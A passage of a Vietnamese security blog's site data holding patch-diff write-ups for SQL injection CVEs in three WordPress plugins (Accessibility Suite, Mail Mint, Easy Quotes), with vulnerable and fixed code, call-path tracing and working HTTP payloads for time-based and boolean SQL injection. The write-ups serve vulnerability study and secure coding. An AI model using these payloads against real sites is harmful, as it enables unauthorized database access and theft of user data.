other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php 